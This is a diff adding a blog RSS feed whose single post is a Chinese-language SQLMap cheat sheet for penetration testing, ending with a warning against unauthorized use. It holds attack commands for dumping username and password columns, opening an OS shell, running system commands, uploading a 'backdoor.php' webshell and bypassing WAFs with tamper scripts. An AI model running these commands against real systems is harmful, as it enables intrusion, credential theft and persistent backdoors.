@@ -1,0 +1,264 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>bae的博客 • Posts by &#34;渗透测试&#34; category</title>
+        <link>https://bae-ace.github.io</link>
+        <description>bae的个人博客</description>
+        <language>zh-CN</language>
+        <pubDate>Mon, 21 Jul 2025 19:33:02 +0800</pubDate>
+        <lastBuildDate>Mon, 21 Jul 2025 19:33:02 +0800</lastBuildDate>
+        <category>PWN</category>
+        <category>ELF</category>
+        <category>ROP</category>
+        <category>CTF</category>
+        <category>二进制安全</category>
+        <category>hexo</category>
+        <category>博客搭建</category>
+        <category>初始测试</category>
+        <category>linux</category>
+        <category>命令</category>
+        <category>信息收集</category>
+        <category>子域名</category>
+        <category>渗透测试</category>
+        <category>工具</category>
+        <category>sqlmap</category>
+        <item>
+            <guid isPermalink="true">https://bae-ace.github.io/2025/07/21/SQLMap-%E8%87%AA%E5%8A%A8%E5%8C%96-SQL-%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/</guid>
+            <title>SQLMap 自动化 SQL 注入工具</title>
+            <link>https://bae-ace.github.io/2025/07/21/SQLMap-%E8%87%AA%E5%8A%A8%E5%8C%96-SQL-%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/</link>
+            <category>渗透测试</category>
+            <category>工具</category>
+            <category>sqlmap</category>
+            <pubDate>Mon, 21 Jul 2025 19:33:02 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;SQLMap-自动化-SQL-注入工具&#34;&gt;&lt;a href=&#34;#SQLMap-自动化-SQL-注入工具&#34; class=&#34;headerlink&#34; title=&#34;SQLMap 自动化 SQL 注入工具&#34;&gt;&lt;/a&gt;SQLMap 自动化 SQL 注入工具&lt;/h2&gt;&lt;h2 id=&#34;一、🔍-核心功能与命令选项&#34;&gt;&lt;a href=&#34;#一、🔍-核心功能与命令选项&#34; class=&#34;headerlink&#34; title=&#34;一、🔍 核心功能与命令选项&#34;&gt;&lt;/a&gt;一、🔍 核心功能与命令选项&lt;/h2&gt;&lt;h3 id=&#34;（一）基础检测类-🧪&#34;&gt;&lt;a href=&#34;#（一）基础检测类-🧪&#34; class=&#34;headerlink&#34; title=&#34;（一）基础检测类 🧪&#34;&gt;&lt;/a&gt;（一）基础检测类 🧪&lt;/h3&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;任务分类&lt;/th&gt;
+&lt;th&gt;命令选项&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;th&gt;示例命令&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;检测注入点&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;-u &amp;lt;url&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;指定目标 URL&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sqlmap -u &amp;quot;http://x.com/index.php?id=1&amp;quot; --batch&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;POST 请求注入&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;--data&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;提交 POST 数据&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sqlmap -u &amp;quot;http://x.com/login.php&amp;quot; --data=&amp;quot;user=admin&amp;amp;pass=123&amp;quot;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Cookie 注入&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;--cookie&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;携带 Cookie 信息&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sqlmap -u &amp;quot;http://x.com&amp;quot; --cookie=&amp;quot;PHPSESSID=123&amp;quot;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;强制 dbms&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;--dbms=&amp;lt;类型&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;强制指定数据库类型&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sqlmap -u &amp;quot;...?id=1&amp;quot; --dbms=mysql&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;绕过 WAF&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;--tamper=&amp;lt;脚本&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;使用 Tamper 脚本&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sqlmap -u &amp;quot;...?id=1&amp;quot; --tamper=charunicodeencode&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;h3 id=&#34;（二）数据枚举类-📚&#34;&gt;&lt;a href=&#34;#（二）数据枚举类-📚&#34; class=&#34;headerlink&#34; title=&#34;（二）数据枚举类 📚&#34;&gt;&lt;/a&gt;（二）数据枚举类 📚&lt;/h3&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;任务分类&lt;/th&gt;
+&lt;th&gt;命令选项&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;th&gt;示例命令&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;枚举所有数据库&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;--dbs&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;列出目标所有数据库&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sqlmap -u &amp;quot;...?id=1&amp;quot; --dbs&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;枚举指定数据库表&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;-D &amp;lt;db&amp;gt; --tables&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;列出指定数据库的表&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sqlmap -u &amp;quot;...?id=1&amp;quot; -D mydb --tables&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;枚举字段&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;-D &amp;lt;db&amp;gt; -T &amp;lt;table&amp;gt; --columns&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;列出表字段&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sqlmap -u &amp;quot;...?id=1&amp;quot; -D mydb -T users --columns&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;导出字段数据&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;-D &amp;lt;db&amp;gt; -T &amp;lt;table&amp;gt; -C &amp;lt;cols&amp;gt; --dump&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;指定字段并导出&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sqlmap -u &amp;quot;...?id=1&amp;quot; -D mydb -T users -C username,password --dump&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;获取数据库用户&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;--users&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;获取数据库用户信息&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sqlmap -u &amp;quot;...?id=1&amp;quot; --users&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;h3 id=&#34;（三）高级操作类-🛠️&#34;&gt;&lt;a href=&#34;#（三）高级操作类-🛠️&#34; class=&#34;headerlink&#34; title=&#34;（三）高级操作类 🛠️&#34;&gt;&lt;/a&gt;（三）高级操作类 🛠️&lt;/h3&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;任务分类&lt;/th&gt;
+&lt;th&gt;命令选项&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;th&gt;示例命令&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;获取系统 Shell&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;--os-shell&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;打开 OS Shell（高权限需）&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sqlmap -u &amp;quot;...?id=1&amp;quot; --os-shell&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;上传文件&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;--file-write/--file-dest&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;上传文件到目标服务器&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sqlmap -u &amp;quot;...?id=1&amp;quot; --file-write=backdoor.php --file-dest=/var/www/html/backdoor.php&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;权限提升&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;--priv-esc&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;数据库用户权限提升尝试&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sqlmap -u &amp;quot;...?id=1&amp;quot; --priv-esc&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;执行系统命令&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;--os-cmd=&amp;quot;&amp;lt;命令&amp;gt;&amp;quot;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;执行系统命令&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sqlmap -u &amp;quot;...?id=1&amp;quot; --os-cmd=&amp;quot;whoami&amp;quot;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;h2 id=&#34;二、🎯-实用场景命令示例&#34;&gt;&lt;a href=&#34;#二、🎯-实用场景命令示例&#34; class=&#34;headerlink&#34; title=&#34;二、🎯 实用场景命令示例&#34;&gt;&lt;/a&gt;二、🎯 实用场景命令示例&lt;/h2&gt;&lt;h3 id=&#34;✅-基础注入检测&#34;&gt;&lt;a href=&#34;#✅-基础注入检测&#34; class=&#34;headerlink&#34; title=&#34;✅ 基础注入检测&#34;&gt;&lt;/a&gt;✅ 基础注入检测&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 基本 GET 请求注入&lt;/span&gt;&lt;br&gt;sqlmap -u &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://testphp.vulnweb.com/artists.php?artist=1&amp;quot;&lt;/span&gt; --batch&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# POST 表单注入（如登录）&lt;/span&gt;&lt;br&gt;sqlmap -u &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target.com/login.php&amp;quot;&lt;/span&gt; --data=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;username=admin&amp;amp;password=admin&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;📚-数据枚举与导出&#34;&gt;&lt;a href=&#34;#📚-数据枚举与导出&#34; class=&#34;headerlink&#34; title=&#34;📚 数据枚举与导出&#34;&gt;&lt;/a&gt;📚 数据枚举与导出&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 枚举数据库&lt;/span&gt;&lt;br&gt;sqlmap -u &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target.com/index.php?id=1&amp;quot;&lt;/span&gt; --dbs&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 枚举指定数据库表&lt;/span&gt;&lt;br&gt;sqlmap -u &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target.com/index.php?id=1&amp;quot;&lt;/span&gt; -D testdb --tables&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 枚举表字段&lt;/span&gt;&lt;br&gt;sqlmap -u &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target.com/index.php?id=1&amp;quot;&lt;/span&gt; -D testdb -T &lt;span class=&#34;hljs-built_in&#34;&gt;users&lt;/span&gt; --columns&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 导出字段数据&lt;/span&gt;&lt;br&gt;sqlmap -u &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target.com/index.php?id=1&amp;quot;&lt;/span&gt; -D testdb -T &lt;span class=&#34;hljs-built_in&#34;&gt;users&lt;/span&gt; -C username,password --dump&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;🧨-高级渗透操作&#34;&gt;&lt;a href=&#34;#🧨-高级渗透操作&#34; class=&#34;headerlink&#34; title=&#34;🧨 高级渗透操作&#34;&gt;&lt;/a&gt;🧨 高级渗透操作&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 获取 OS Shell&lt;/span&gt;&lt;br&gt;sqlmap -u &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target.com/index.php?id=1&amp;quot;&lt;/span&gt; --os-shell&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 上传 WebShell&lt;/span&gt;&lt;br&gt;sqlmap -u &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target.com/index.php?id=1&amp;quot;&lt;/span&gt; --file-write=backdoor.php --file-dest=/var/www/html/backdoor.php&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;三、🎛️-关键参数与使用技巧&#34;&gt;&lt;a href=&#34;#三、🎛️-关键参数与使用技巧&#34; class=&#34;headerlink&#34; title=&#34;三、🎛️ 关键参数与使用技巧&#34;&gt;&lt;/a&gt;三、🎛️ 关键参数与使用技巧&lt;/h2&gt;&lt;h3 id=&#34;📏-检测控制&#34;&gt;&lt;a href=&#34;#📏-检测控制&#34; class=&#34;headerlink&#34; title=&#34;📏 检测控制&#34;&gt;&lt;/a&gt;📏 检测控制&lt;/h3&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;参数&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;--level=1~5&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;设置检测深度（默认 1），高等级检测更多参数&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;--risk=1~3&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;设置风险等级（默认 1），高等级尝试更危险 payload&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;--random-agent&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;使用随机 UA，减少被识别为工具概率&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;h3 id=&#34;🧰-调试与代理支持&#34;&gt;&lt;a href=&#34;#🧰-调试与代理支持&#34; class=&#34;headerlink&#34; title=&#34;🧰 调试与代理支持&#34;&gt;&lt;/a&gt;🧰 调试与代理支持&lt;/h3&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;参数&lt;/th&gt;
+&lt;th&gt;功能&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;--proxy=&amp;quot;http://127.0.0.1:8080&amp;quot;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;配合 Burp 抓包调试&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;-v 0~6&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;日志输出详细程度（如 &lt;code&gt;-v 3&lt;/code&gt; 显示 payload）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;--flush-session&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;清除缓存，重新检测&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;h3 id=&#34;🕳️-绕过防护技巧&#34;&gt;&lt;a href=&#34;#🕳️-绕过防护技巧&#34; class=&#34;headerlink&#34; title=&#34;🕳️ 绕过防护技巧&#34;&gt;&lt;/a&gt;🕳️ 绕过防护技巧&lt;/h3&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;脚本名&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;apostrophemask&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;编码单引号绕过&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;base64encode&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;对 Payload Base64 编码绕过&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;space2comment&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;使用注释代替空格（如：&lt;code&gt;SELECT/**/1&lt;/code&gt;）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;p&gt;示例：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;sqlmap -u &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;...?id=1&amp;quot;&lt;/span&gt; --tamper=base64encode&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 多脚本组合&lt;/span&gt;&lt;br&gt;sqlmap -u &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;...?id=1&amp;quot;&lt;/span&gt; --tamper=between,charunicodeencode&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;四、📌-常用命令速查表&#34;&gt;&lt;a href=&#34;#四、📌-常用命令速查表&#34; class=&#34;headerlink&#34; title=&#34;四、📌 常用命令速查表&#34;&gt;&lt;/a&gt;四、📌 常用命令速查表&lt;/h2&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;功能&lt;/th&gt;
+&lt;th&gt;示例命令&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;基础检测&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sqlmap -u &amp;quot;http://x.com/?id=1&amp;quot;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;POST 注入&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sqlmap -u &amp;quot;http://x.com/login.php&amp;quot; --data=&amp;quot;user=admin&amp;amp;pass=123&amp;quot;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;枚举数据库&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sqlmap -u &amp;quot;...?id=1&amp;quot; --dbs&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;枚举表与字段&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;-D mydb --tables&lt;/code&gt;、&lt;code&gt;-T users --columns&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;导出数据&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;-D db -T table -C col1,col2 --dump&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;获取系统 Shell&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;--os-shell&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;绕过 WAF&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;--tamper=base64encode&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;p&gt;✅ &lt;strong&gt;总结与建议&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;🔐 切勿在未授权目标上使用 SQLMap！&lt;/li&gt;
+&lt;li&gt;🔄 推荐使用 &lt;code&gt;--batch&lt;/code&gt; 避免交互中断，适合脚本化执行。&lt;/li&gt;
+&lt;li&gt;🧪 利用 &lt;code&gt;-r&lt;/code&gt; 加载 Burp 捕获的请求文件，更真实模拟攻击场景。&lt;/li&gt;
+&lt;li&gt;📌 常用指令可整理成脚本，提升实战效率。&lt;/li&gt;
+&lt;/ul&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
